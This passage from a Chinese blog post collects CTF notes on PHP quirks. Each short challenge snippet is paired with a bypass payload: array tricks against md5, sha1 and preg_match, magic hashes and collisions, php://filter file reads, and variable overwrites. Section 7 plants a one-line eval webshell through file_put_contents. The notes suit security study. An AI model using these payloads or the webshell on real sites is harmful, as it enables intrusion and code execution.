<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="晨曦"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="http://example.com/2025/03/04/web/php特性/奇奇妙妙的特性/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="1、数组绕过正则表达式if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;        die(&quot;no no no!&quot;);    &amp;#125;else(intval($num))&amp;#123;        echo $flag;    &amp;#125; preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句 paylo"><meta property="og:type" content="article"><meta property="og:title" content="php特性"><meta property="og:url" content="http://example.com/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/index.html"><meta property="og:site_name" content="晨曦的小屋"><meta property="og:description" content="1、数组绕过正则表达式if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;        die(&quot;no no no!&quot;);    &amp;#125;else(intval($num))&amp;#123;        echo $flag;    &amp;#125; preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句 paylo"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2025-03-04T18:51:52.000Z"><meta property="article:modified_time" content="2025-04-26T11:30:29.888Z"><meta property="article:author" content="晨曦"><meta property="article:tag" content="web"><meta property="article:tag" content="php"><meta name="twitter:card" content="summary"><link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/78677516?s=400&amp;u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&amp;v=4" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/78677516?s=400&amp;u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&amp;v=4"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4"><title>php特性 | とある晨曦の幻想乡</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/assets/build/styles.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[""]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:!0,lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:"myblog",url:"https://blog.xuchengxi.tk/files/Monaco.ttf"},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!1,scale:!1},scroll_progress:{bar:!0,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},open_graph:!0,google_analytics:{enable:!1,id:null},busuanzi_counter:{enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},pjax:!0},home_banner:{enable:!0,style:"fixed",image:{light:"https://gitee.com/xuchengxiblog/xuchengxiblog.gitee.io/raw/master/picture/background1.webp",dark:"https://gitee.com/xuchengxiblog/xuchengxiblog.gitee.io/raw/master/picture/2.webp"},title:"萍水相逢，尽是他乡之客",subtitle:{text:["Hello world!"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://www.github.com/xcx2006",instagram:null,zhihu:null,twitter:null,email:"xuchengxi2006@outlook.com"},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!0,type:"fixed",audios:[{name:"風の住む街",artist:"磯村由紀子",url:"https://blog.starlit.icu/files/%E7%A3%AF%E6%9D%91%E7%94%B1%E7%B4%80%E5%AD%90%20-%20%E9%A2%A8%E3%81%AE%E4%BD%8F%E3%82%80%E8%A1%97.mp3",cover:"https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4",lrc:null},{name:"The Truth That You Leave",artist:"Pianoboy高至豪",url:"https://blog.starlit.icu/files/Pianoboy高至豪 - The Truth That You Leave.mp3",cover:"https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4"},{name:"Windy Hill",artist:"羽肿",url:"https://blog.starlit.icu/files/羽肿 - Windy Hill.mp3",cover:"https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4"}]},mermaid:{enable:!0,version:"9.3.0"}},version:"2.7.3",navbar:{auto_hide:!0,color:{left:"#f78736",right:"#367df7",transparency:99},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},"文章":{submenus:{"归档":"/archives","分类":"/categories","标签":"/tags"}},About:{submenus:{"我":"/about",Friends:"/friends"}}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}},footerStart:"2020/12/30 11:45:14"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><link rel="stylesheet" href="/fontawesome/light.min.css"><link rel="stylesheet" href="/fontawesome/duotone.min.css"><link rel="stylesheet" href="/fontawesome/sharp-solid.min.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="晨曦的小屋" type="application/atom+xml"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-title" href="/">とある晨曦の幻想乡</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;>文章 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/archives">归档</a></li><li><a href="/categories">分类</a></li><li><a href="/tags">标签</a></li></ul></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;>关于 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/about">我</a></li><li><a href="/friends">友情链接</a></li></ul></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-文章"><span>文章</span></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-文章"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/archives">归档</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/categories">分类</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/tags">标签</a></div></div></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-About"><span>关于</span></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/about">我</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/friends">友情链接</a></div></div></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">64</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">26</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">77</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">php特性</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="https://avatars.githubusercontent.com/u/78677516?s=400&u=ecb4efb1b3a8e369aa59914106ede3bcf8cc156d&v=4"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">晨曦</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1"></span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-03-04 18:51:52</span> <span class="mobile">2025-03-04 18:51:52</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-04-26 11:30:29</span> <span class="mobile">2025-04-26 11:30:29</span> <span class="hover-info">更新</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/php%E7%89%B9%E6%80%A7/">php特性</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/web/">web</a>&nbsp;</li><li>| <a href="/tags/php/">php</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.1k 字</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>14 分钟</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><h1 id="1、数组绕过正则表达式"><a href="#1、数组绕过正则表达式" class="headerlink" title="1、数组绕过正则表达式"></a>1、数组绕过正则表达式</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">else(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句</p><p>payload:num[]&#x3D;1</p><h1 id="2、intval函数的使用"><a href="#2、intval函数的使用" class="headerlink" title="2、intval函数的使用"></a>2、intval函数的使用</h1><p>intval( mixed $value, int $base &#x3D; 10) : int<br>如果 base 是 0，通过检测 value 的格式来决定使用的进制：<br>◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>◦ 将使用 10 进制 (decimal)。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>科学计数法也可以绕过</p><p>intval(‘4476.0’)&#x3D;&#x3D;&#x3D;4476 小数点<br>intval(‘+4476.0’)&#x3D;&#x3D;&#x3D;4476 正负号<br>intval(‘4476e0’)&#x3D;&#x3D;&#x3D;4476 科学计数法<br>intval(‘0x117c’)&#x3D;&#x3D;&#x3D;4476 16进制<br>intval(‘010574’)&#x3D;&#x3D;&#x3D;4476 8进制<br>intval(‘ 010574’)&#x3D;&#x3D;&#x3D;4476 8进制+空格<br>payload:num&#x3D;4476.0</p><p>这里补充一下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(42);                      // 42</span><br><span class="line">echo intval(4.2);                     // 4</span><br><span class="line">echo intval(&#x27;42&#x27;);                    // 42</span><br><span class="line">echo intval(&#x27;+42&#x27;);                   // 42</span><br><span class="line">echo intval(&#x27;-42&#x27;);                   // -42</span><br><span class="line">echo intval(042);                     // 34</span><br><span class="line">echo intval(&#x27;042&#x27;);                   // 42</span><br><span class="line">echo intval(1e10);                    // 10000000000</span><br><span class="line">echo intval(&#x27;1e10&#x27;);                  // 10000000000</span><br><span class="line">echo intval(0x1A);                    // 26</span><br><span class="line">echo intval(42000000);                // 42000000</span><br><span class="line">echo intval(420000000000000000000);   // 0</span><br><span class="line">echo intval(&#x27;420000000000000000000&#x27;); // 2147483647</span><br><span class="line">echo intval(42, 8);                   // 42</span><br><span class="line">echo intval(&#x27;42&#x27;, 8);                 // 34</span><br><span class="line">echo intval(array());                 // 0</span><br><span class="line">echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h1 id="3、正则表达式修饰符"><a href="#3、正则表达式修饰符" class="headerlink" title="3、正则表达式修饰符"></a>3、正则表达式修饰符</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>i 不区分(ignore)大小写；m多(more)行匹配，若有换行符则以换行符分割，按行匹配</p><p>payload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过</p><h1 id="4、highlight-file路径"><a href="#4、highlight-file路径" class="headerlink" title="4、highlight_file路径"></a>4、highlight_file路径</h1><p>highlight_file的参数可以是路径的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 绝对路径<br>.&#x2F;flag.php 相对路径<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php php伪协议</p><h1 id="5、md5比较缺陷"><a href="#5、md5比较缺陷" class="headerlink" title="5、md5比较缺陷"></a>5、md5比较缺陷</h1><p>PHP中hash比较是存在缺陷的，MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;</span><br><span class="line">    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">    print &#x27;Wrong.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>不同数据强相等</p><p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p><p>md5弱比较，使用了强制类型转换后不再接收数组</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</p><p>不同数据弱相等</p><p>payload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p><p>MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017</p><p>md5强碰撞</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这时候需要找到两个真正的md5值相同数据</p><p>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><h1 id="6、三目运算符的理解-变量覆盖"><a href="#6、三目运算符的理解-变量覆盖" class="headerlink" title="6、三目运算符的理解+变量覆盖"></a>6、三目运算符的理解+变量覆盖</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br></pre></td></tr></table></figure></div><p>太经典了，我晕了</p><p>第一行，GET被设置，就可以用POST覆盖GET的值。中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它</p><p>payload:get：1&#x3D;1 post：HTTP_FLAG&#x3D;flag</p><h1 id="7、php弱类型比较"><a href="#7、php弱类型比较" class="headerlink" title="7、php弱类型比较"></a>7、php弱类型比较</h1><p>经典</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>弱比较字符串1.php与1返回true。array_push这个函数往里填数字1，则是int类型，in_array使用的就是&#x3D;&#x3D;弱比较。所以，如果数组里有数字1，与字符串1.php比较时是返回true的。注意，$array( 1 , ‘2’ , ‘3’ )，这里1是int型，2和3都是string类型。</p><p>这道题，每次生成随机数都包含1，所以1在数组中的可能最大。</p><p>payload:n&#x3D;1.php post:content&#x3D;<?php eval($_POST[1]);?>多试几次，然后蚁剑直接连</p><h1 id="8、and与-amp-amp-的区别"><a href="#8、and与-amp-amp-的区别" class="headerlink" title="8、and与&amp;&amp;的区别"></a>8、and与&amp;&amp;的区别</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=true and false and false;</span><br><span class="line">var_dump($a);  返回true</span><br><span class="line"></span><br><span class="line">$a=true &amp;&amp; false &amp;&amp; false;</span><br><span class="line">var_dump($a);  返回false</span><br></pre></td></tr></table></figure></div><h1 id="9、反射类ReflectionClass"><a href="#9、反射类ReflectionClass" class="headerlink" title="9、反射类ReflectionClass"></a>9、反射类ReflectionClass</h1><p>反射类还不太懂，但做过题都是直接输出这个类echo new ReflectionClass(‘类名’);</p><h1 id="10、is-numeric与hex2bin"><a href="#10、is-numeric与hex2bin" class="headerlink" title="10、is_numeric与hex2bin"></a>10、is_numeric与hex2bin</h1><p>​ is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x</p><h1 id="11、sha1比较缺陷"><a href="#11、sha1比较缺陷" class="headerlink" title="11、sha1比较缺陷"></a>11、sha1比较缺陷</h1><p>sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($a==$b)&#123;</span><br><span class="line">    if(sha1($a)==sha1($b))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如</p><p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p><h1 id="12、PHP双-（-）的变量覆盖"><a href="#12、PHP双-（-）的变量覆盖" class="headerlink" title="12、PHP双$（$$）的变量覆盖"></a>12、PHP双$（$$）的变量覆盖</h1><p>在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$test=&quot;a23&quot;;    $test等于a23</span><br><span class="line">$$test=456;        $$test也就等于$23,这里相当于给$a23赋值了</span><br><span class="line">echo $test;        正常输出$test为a23</span><br><span class="line">echo $$test;    这里输出$$test，就是$a23，为456</span><br><span class="line">echo $a23;        第二行给$a23赋值了，这里正常输出</span><br></pre></td></tr></table></figure></div><h1 id="13、parse-str函数的使用"><a href="#13、parse-str函数的使用" class="headerlink" title="13、parse_str函数的使用"></a>13、parse_str函数的使用</h1><p>parse_str会把字符串解析为变量，大部分是传入的多个值</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&quot;q=123&amp;p=456&quot;;</span><br><span class="line">parse_str($a);</span><br><span class="line">echo $q;                输出123</span><br><span class="line">echo $p;                输出456</span><br><span class="line">parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中</span><br><span class="line">echo $b[&#x27;q&#x27;];            输出123</span><br><span class="line">echo $b[&#x27;p&#x27;];            输出456</span><br></pre></td></tr></table></figure></div><p>php8版本必须要有第二个参数，php7不影响使用但会警告一下</p><h1 id="14、ereg-00正则截断"><a href="#14、ereg-00正则截断" class="headerlink" title="14、ereg %00正则截断"></a>14、ereg %00正则截断</h1><p>ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。</p><h1 id="15、迭代器获取当前目录"><a href="#15、迭代器获取当前目录" class="headerlink" title="15、迭代器获取当前目录"></a>15、迭代器获取当前目录</h1><p>FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，getcwd()这个函数可以获取当前文件路径，二者在一定条件下配合使用较好</p><h1 id="16、-GLOBALS全局变量的使用"><a href="#16、-GLOBALS全局变量的使用" class="headerlink" title="16、$GLOBALS全局变量的使用"></a>16、$GLOBALS全局变量的使用</h1><p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义</p><h1 id="17、php伪协议绕过is-file-highlight-file对于php伪协议的使用"><a href="#17、php伪协议绕过is-file-highlight-file对于php伪协议的使用" class="headerlink" title="17、php伪协议绕过is_file highlight_file对于php伪协议的使用"></a>17、php伪协议绕过is_file highlight_file对于php伪协议的使用</h1><p>is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式</p><h1 id="18、多写根目录绕过is-file"><a href="#18、多写根目录绕过is-file" class="headerlink" title="18、多写根目录绕过is_file"></a>18、多写根目录绕过is_file</h1><p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls 